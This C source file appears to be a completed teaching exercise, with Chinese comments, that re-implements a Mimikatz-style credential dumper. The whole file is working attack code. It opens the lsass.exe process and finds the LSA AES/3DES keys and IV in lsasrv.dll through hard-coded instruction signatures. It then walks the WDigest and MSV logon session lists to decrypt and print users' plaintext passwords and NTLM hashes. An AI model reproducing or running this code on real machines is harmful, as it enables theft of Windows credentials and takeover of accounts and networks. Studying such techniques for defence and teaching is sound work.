#include "sekurlsa.h"
#include "utils.h"
#include <stdio.h>

#pragma comment (lib, "bcrypt.lib")

#define AES_128_KEY_LENGTH	16
#define DES_3DES_KEY_LENGTH	24

/*****************************************************
 *         module level global variables             *
 *****************************************************/

BYTE g_sekurlsa_IV[AES_128_KEY_LENGTH];
BYTE g_sekurlsa_AESKey[AES_128_KEY_LENGTH];
BYTE g_sekurlsa_3DESKey[DES_3DES_KEY_LENGTH];
HANDLE g_hLsass = 0;

/*****************************************************
 *         以下的函数均无需额外修改可直接调用           *
 *****************************************************/

/// 查找并返回 lsass.exe 进程的PID
DWORD GetLsassPid() {

	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
				CloseHandle(hSnapshot);
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

/// 获取 PID 为 pid 的进程句柄
HANDLE GrabLsassHandle(IN DWORD pid) {
	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	return procHandle;
}

VOID SetGlobalLsassHandle() {
	g_hLsass = GrabLsassHandle(GetLsassPid());
}

VOID PrepareUnprotectLsassMemoryKeys() {
	SetGlobalLsassHandle();
	LocateUnprotectLsassMemoryKeys();

	puts("");
	printf("[+] Aes Key recovered as:\n");
	HexdumpBytes(g_sekurlsa_AESKey, AES_128_KEY_LENGTH);

	printf("[+] InitializationVector recovered as:\n");
	HexdumpBytes(g_sekurlsa_IV, AES_128_KEY_LENGTH);

	printf("[+] 3Des Key recovered as:\n");
	HexdumpBytes(g_sekurlsa_3DESKey, DES_3DES_KEY_LENGTH);

	printf("[+] Not all zeros ... \n");
	printf("[+] All keys seems OK ... \n\n");
}

/// 在由 mem 指针指向的内存区域 [mem,mem+0x200000] 中搜索字节序列 signature 首次出现的偏移，并返回
DWORD SearchPattern(IN PUCHAR mem, IN PUCHAR signature, IN DWORD signatureLen) {
	for (DWORD offset = 0; offset < 0x200000; offset++)
		if (mem[offset] == signature[0] && mem[offset+1] == signature[1])
			if (memcmp(mem + offset, signature, signatureLen) == 0)
				return offset;
	return 0;
}

/// 从 lsass.exe 进程的内存中的地址 addr 上读取 memOutLen 个字节存入指针 memOut 中
SIZE_T ReadFromLsass(IN LPCVOID addr, OUT LPVOID memOut, IN SIZE_T memOutLen) {
	SIZE_T bytesRead = 0;
	memset(memOut, 0, memOutLen);
	ReadProcessMemory(g_hLsass, addr, memOut, memOutLen, &bytesRead);
	return bytesRead;
}

/// 使用 g_sekurlsa_IV g_sekurlsa_AESKey 或是 g_sekurlsa_3DESKey 对缓存在lsass.exe内存中的凭据进行解密
ULONG DecryptCredentials(PCHAR encrypedPass, DWORD encryptedPassLen, PUCHAR decryptedPass, ULONG decryptedPassLen) {
	BCRYPT_ALG_HANDLE hProvider, hDesProvider;
	BCRYPT_KEY_HANDLE hAes, hDes;
	ULONG result;
	NTSTATUS status;
	unsigned char initializationVector[16];

	// Same IV used for each cred, so we need to work on a local copy as this is updated
	// each time by BCryptDecrypt
	memcpy(initializationVector, g_sekurlsa_IV, sizeof(g_sekurlsa_IV));

	if (encryptedPassLen % 8) {
		// If suited to AES, lsasrv uses AES in CFB mode
		status = BCryptOpenAlgorithmProvider(&hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptGenerateSymmetricKey(hProvider, &hAes, NULL, 0, g_sekurlsa_AESKey, sizeof(g_sekurlsa_AESKey), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptDecrypt(hAes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, sizeof(g_sekurlsa_IV), decryptedPass, decryptedPassLen, &result, 0);
		if (status != 0) {
			return 0;
		}
		return result;
	}
	else {
		// If suited to 3DES, lsasrv uses 3DES in CBC mode
		status = BCryptOpenAlgorithmProvider(&hDesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptGenerateSymmetricKey(hDesProvider, &hDes, NULL, 0, g_sekurlsa_3DESKey, sizeof(g_sekurlsa_3DESKey), 0);
		if (!NT_SUCCESS(status)) return 0;
		status = BCryptDecrypt(hDes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, 8, decryptedPass, decryptedPassLen, &result, 0);
		if (status != 0) {
			return 0;
		}
		return result;
	}
}

BOOL getUnicodeString(PUNICODE_STRING string)
{
	BOOL status = FALSE;
	PVOID source = string->Buffer;
	string->Buffer = (PWSTR)LocalAlloc(LPTR, string->MaximumLength);
	SIZE_T bytesRead = ReadFromLsass(source, string->Buffer, string->MaximumLength);
	return status;
}

PUNICODE_STRING ExtractUnicodeString(PUNICODE_STRING pUnicodeString) {
	PUNICODE_STRING pResult;
	PWSTR mem;

	// Read LSA_UNICODE_STRING from lsass memory
	pResult = (PUNICODE_STRING)LocalAlloc(LPTR, sizeof(UNICODE_STRING));
	if (pResult == NULL) return NULL;
	ReadFromLsass(pUnicodeString, pResult, sizeof(UNICODE_STRING));

	// Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
	mem = LocalAlloc(LPTR, pResult->MaximumLength);
	if (mem == NULL) return NULL;
	ReadFromLsass(pResult->Buffer, mem, pResult->MaximumLength);
	pResult->Buffer = mem;
	return pResult;
}

VOID FreeUnicodeString(UNICODE_STRING* unicode) {
	LocalFree(unicode->Buffer);
	LocalFree(unicode);
}

/*****************************************************
 *         以上的函数均无需修改可直接调用               *
 *****************************************************/












/*****************************************************
 *  请将以下的三个函数填写完整，并实现对应的功能         *
 *    - LocateUnprotectLsassMemoryKeys               *
 *	  - GetCredentialsFromMSV                        *
 *	  - GetCredentialsFromWdigest                    *
 *****************************************************/

/// 从 lsass.exe 内存中读取出后续对凭据进行AES解密或是3DES解密使用的密钥
/// 设置相应的全局变量 g_sekurlsa_IV g_sekurlsa_AESKey g_sekurlsa_3DESKey
/// 推荐API: SearchPattern() ReadFromLsass()
VOID LocateUnprotectLsassMemoryKeys() {
	DWORD keySigOffset = 0;
	DWORD aesOffset = 0;
	DWORD desOffset = 0;
	DWORD IVOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY hAesKey;
	KIWI_BCRYPT_HANDLE_KEY hDesKey;
	KIWI_BCRYPT_KEY81 extractedAesKey;
	KIWI_BCRYPT_KEY81 extractedDesKey;
	PVOID keyPointer = NULL;

	// 将lsass.exe所加载的模块lsasrv.dll加载入当前进程的内存空间中
	// 其所加载的基地址 lsasrvBaseAddress 与 lsass.exe 进程中 lsasrv.dll 模块的基地址是相同的
	// （同一个DLL模块在不同进程中会被加载到同一地址， ALSR 随机化不影响此行为）
	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");

	// lsasrv.dll 模块中的全局变量 hAesKey 是一个指向实际AES密钥的结构体指针，接下来定位hAesKey在lsass.exe进程中的地址

	// 以下硬编码的字节序列签名在Windows 10与Windows 11上测试可用，非Win10、Win11可能失效
	UCHAR keyAESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 
						0x48, 0x8d, 0x45, 0xe0, 
						0x44, 0x8b, 0x4d, 0xd8, 
						0x48, 0x8d, 0x15 };

	// lsasrv.dll 中 keyAESSig 字节序列所对应的指令反汇编，其中 99 2C 10 00 (小端数 0x102c99)
	// 为全局变量 hAesKey 所在地址相对下一条指令地址0x1800752BF的偏移
	// 故 hAesKey 结构体所在的地址为 0x1800752BF + 0x102c99 = 0x180177F58
	// .text:00000001800752AB 83 64 24 30 00          and     [rsp+70h+var_40], 0
	// .text:00000001800752B0 48 8D 45 E0             lea     rax, [rbp + pbBuffer]
	// .text:00000001800752B4 44 8B 4D D8             mov     r9d, dword ptr[rbp + var_28]; cbKeyObject
	// .text:00000001800752B8 48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 
	// .text:00000001800752BF 48 8B 0D 9A 2C 10 00    mov     rcx, cs:?hAesProvider ; hAlgorithm
	//       ^^^^^^^^^^^^^^^^ 注释中出现的绝对地址 0x1800752BF 等以 win11的lsasrv.dll 为例，下同

	// 在lsass进程的内存中搜索定位全局变量hAesKey的内存位置
	// 获取首条指令 and [rsp+70h+var_40], 0 相对lsasrv.dll模块基址的偏移
	keySigOffset = SearchPattern(lsasrvBaseAddress, keyAESSig, sizeof keyAESSig);
	printf("keySigOffset = 0x%x\n", keySigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
	if (keySigOffset == 0) return;
	
	// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof keyAESSig 上读取4字节的偏移
	//                     0x180000000       + 0x752AB      + 16              = 0x1800752bb
	// *(DWORD *)(0x1800752bb) = 0x102c99
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig, &aesOffset, sizeof aesOffset);
	printf("aesOffset = 0x%x\n", aesOffset);	// 0x102c99
	//			0x1800752bb↘
	//				48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 0x1800752B8↗         ^^ ^^ ^^ ^^


	// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset 上读取8字节的数据
	//                     0x180000000       + 0x752AB      + 16              + 4 + 0x102c99  = 0x180177f58
	//
	// .data:0000000180177F58 ?? ?? ?? ?? ?? ?? ?? ?? ?hAesKey@@3PEAXEA dq ?
	// 所读取的8字节的数据是一个指向结构体 KIWI_BCRYPT_HANDLE_KEY 的指针
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset, &keyPointer, sizeof keyPointer);
	printf("keyPointer = 0x%p\n", keyPointer); // 形如 0x000002318B910230
	                                           //                       ^ 由于内存以16字节对齐，故最后4bit必为0

	// 从lsass进程的内存位置 keyPointer 读取出结构题的实际内容
	// 由于 keyPointer 未知，该实际内容已无法使用IDA Pro通过静态分析得到
	ReadFromLsass(keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
	
	// 读取 KIWI_BCRYPT_HANDLE_KEY 结构体中类型为 PKIWI_BCRYPT_KEY81 的成员变量指针所指向的 KIWI_BCRYPT_KEY81 结构体
	// AES DES 密钥均使用 KIWI_BCRYPT_KEY81 结构体包裹
	ReadFromLsass(hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY81));

	// KIWI_BCRYPT_KEY81 中 hardkey.data包含密钥字节内容， hardkey.cbSecret包含密钥的长度
	memcpy(g_sekurlsa_AESKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);

	printf("AES Key Located (len %d): ", extractedAesKey.hardkey.cbSecret);
	HexdumpBytesPacked(extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
	puts("");

	// 请继续定位全局变量 h3DesKey InitializationVector 所相关的密钥参数
	// 填入全局变量 g_sekurlsa_IV g_sekurlsa_3DESKey 中
	// ~ 30 lines of code
	// 对于h3DesKey的定位与解析，与hAesKey的定位与解析过程类似

	//硬编码DESSig
	UCHAR key3DESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 
						0x48, 0x8d, 0x45, 0xe0, 
						0x44, 0x8b, 0x4d, 0xd4, 
						0x48, 0x8d, 0x15 };
	keySigOffset = SearchPattern(lsasrvBaseAddress, key3DESSig, sizeof key3DESSig);
	printf("keySigOffset = 0x%x\n", keySigOffset);	
	if (keySigOffset == 0) return;
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof key3DESSig, &desOffset, sizeof desOffset);
	printf("desOffset = 0x%x\n", desOffset);

	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof key3DESSig + 4 + desOffset, &keyPointer, sizeof keyPointer);
	printf("keyPointer = 0x%p\n", keyPointer);

	ReadFromLsass(keyPointer, &hDesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	ReadFromLsass(hDesKey.key, &extractedDesKey, sizeof(KIWI_BCRYPT_KEY81));
	memcpy(g_sekurlsa_3DESKey, extractedDesKey.hardkey.data, extractedDesKey.hardkey.cbSecret);

	printf("3DES Key Located (len %d): ", extractedDesKey.hardkey.cbSecret);
	HexdumpBytesPacked(extractedDesKey.hardkey.data, extractedDesKey.hardkey.cbSecret);
	puts("");


	//InitialVector
	UCHAR IVSig[] = {  0x44, 0x8d, 0x4e, 
						0xf2, 0x44, 0x8b, 0xc6, 
						0x48, 0x8d, 0x15 };
	keySigOffset = SearchPattern(lsasrvBaseAddress, IVSig, sizeof IVSig);
	printf("keySigOffset = 0x%x\n", keySigOffset);
	if (keySigOffset == 0) return;
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof IVSig, &IVOffset, sizeof IVOffset);
	printf("IVOffset = 0x%x\n", IVOffset);

	//得到IV之后做啥
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof IVSig + 4 + IVOffset, &g_sekurlsa_IV, AES_128_KEY_LENGTH);


}

/// 导出Wdigest缓存在内存中的明文密码
VOID GetCredentialsFromWdigest() {
	KIWI_WDIGEST_LIST_ENTRY entry;
	DWORD logSessListSigOffset, logSessListOffset;
	PUCHAR logSessListAddr = 0;
	PUCHAR llCurrent;
	unsigned char passDecrypted[1024] = { 0 };

	// 仿照LocateUnprotectLsassMemoryKeys中的步骤
	// 定位wdigest.dll模块中的全局变量 l_LogSessList 
	//
	PUCHAR wdigestBaseAddress = (PUCHAR)LoadLibraryA("wdigest.dll");
	UCHAR logSessListSig[] = {  0x48, 0x89, 0x58, 0x08,
								0xb8, 0x01, 0x00, 0x00, 0x00,
								0x48, 0x89, 0x1d};
	logSessListSigOffset = SearchPattern(wdigestBaseAddress, logSessListSig, sizeof logSessListSig);
	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof logSessListSig, &logSessListOffset, sizeof logSessListOffset);

	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof logSessListSig + 4 + logSessListOffset, &logSessListAddr, sizeof logSessListAddr);
	// ~ 5 lines of code 
	
	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

	llCurrent = (PUCHAR)entry.This;

	printf("offsetof UserName = 0x%llx\n", offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName));	// 应为 0x30
	printf("offsetof Password = 0x%llx\n", offsetof(KIWI_WDIGEST_LIST_ENTRY, Password));  // 应为 0x50 （win10 win11下验证有效）

	do {
		memset(&entry, 0, sizeof(entry));
		ReadFromLsass(llCurrent, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

		if (entry.UsageCount == 1) {
			UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(llCurrent + offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName)));
			UNICODE_STRING* password = ExtractUnicodeString((PUNICODE_STRING)(llCurrent + offsetof(KIWI_WDIGEST_LIST_ENTRY, Password)));
			
			if (username != NULL && username->Length != 0) printf("Username: %ls\n", username->Buffer);
			else printf("Username: [NULL]\n");

			// Check if password is present
			if (password->Length != 0 && (password->Length % 2) == 0) {
				// Decrypt password using recovered AES/3Des keys and IV
				if (DecryptCredentials((char*)password->Buffer, password->MaximumLength, passDecrypted, sizeof(passDecrypted)) > 0) {
					wprintf(L"Password: %s\n\n", passDecrypted);
				}
			} else {
				printf("Password: [NULL]\n\n");
			}

			FreeUnicodeString(username);
			FreeUnicodeString(password);
		}
		llCurrent = (PUCHAR)entry.Flink;
	} while (llCurrent != logSessListAddr);
	return;
}

/// 推荐API: LoadLibraryA() SearchPattern() ReadFromLsass() DecryptCredentials() ExtractUnicodeString() FreeUnicodeString()
/// 推荐使用结构体: 
///   KIWI_BASIC_SECURITY_LOGON_SESSION_DATA 
///   KIWI_MSV1_0_CREDENTIALS 
///   KIWI_MSV1_0_PRIMARY_CREDENTIALS
///   KUHL_M_SEKURLSA_ENUM_HELPER
VOID GetCredentialsFromMSV() {
	KUHL_M_SEKURLSA_ENUM_HELPER helper = { 0 };
	helper.offsetToCredentials = FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials);
	helper.offsetToUsername = FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName);

	//	
	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");
	// 得到LogSessionList的地址，放到logSedListAddr中
	UCHAR logSedSig[] = { 0x0f, 0x1f, 0x44, 0x00, 0x00, 
							0x8b, 0xc7,
							0x48, 0xc1, 0xe0, 0x04,
							0x48, 0x8d, 0x0d, };

	DWORD logSedSigOffset = SearchPattern(lsasrvBaseAddress, logSedSig, sizeof logSedSig);	
	DWORD logSedListOffset;
	PUCHAR logSedListAddr = 0;
	ReadFromLsass(lsasrvBaseAddress + logSedSigOffset + sizeof logSedSig, &logSedListOffset, sizeof logSedListOffset);
	ReadFromLsass(lsasrvBaseAddress + logSedSigOffset + sizeof logSedSig + 4 + logSedListOffset, &logSedListAddr, sizeof logSedListAddr);

	// 从LogSessionList的地址开始遍历
	PUCHAR llCurrent = logSedListAddr; 
	KIWI_MSV1_0_LIST_63 entry;
	// ~ 10 lines of code 
	//

	do {
		memset(&entry, 0, sizeof(entry));
		ReadFromLsass(llCurrent, &entry, sizeof(KIWI_MSV1_0_LIST_63));
		KIWI_MSV1_0_CREDENTIALS credentials;
		PKIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentialsAddr;
		PKIWI_MSV1_0_CREDENTIALS credentialsAddr = entry.Credentials;
		ReadFromLsass(credentialsAddr, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS));
		primaryCredentialsAddr = credentials.PrimaryCredentials;
		KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
		ReadFromLsass(primaryCredentialsAddr, &primaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));
		unsigned char passDecrypted[1024];

		UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(llCurrent + offsetof(KIWI_MSV1_0_LIST_63, UserName)));
		//UNICODE_STRING* ntml = ExtractUnicodeString(primaryCredentialsAddr + offsetof(KIWI_MSV1_0_PRIMARY_CREDENTIALS,Credentials));
		getUnicodeString(&primaryCredentials.Credentials);
		UNICODE_STRING* ntml = &primaryCredentials.Credentials;
		if (username != NULL && username->Length != 0) printf("Username: %ls\n", username->Buffer);
		else printf("Username: [NULL]\n");

		// 输出长度
		if (primaryCredentials.Credentials.Length != 0 && (primaryCredentials.Credentials.Length % 2) == 0) {
			// Decrypt password using recovered AES/3Des keys and IV
			if (DecryptCredentials((char*)primaryCredentials.Credentials.Buffer, primaryCredentials.Credentials.MaximumLength, passDecrypted, sizeof(passDecrypted)) > 0) {
				printf("NTLMHash: ");
				HexdumpBytesPacked(&passDecrypted[0x4a], 0x10);
				printf("\n\n");
			}
			else {
				printf("NTLMHash: [NULL]\n\n");
			}
		} else {
			printf("NTLMHash: [NULL]\n\n");
		}

		FreeUnicodeString(username);
		LocalFree(primaryCredentials.Credentials.Buffer);
		llCurrent = (PUCHAR)entry.Flink;
		// ~ 10 lines of code
		//

	} while (llCurrent!=logSedListAddr);
}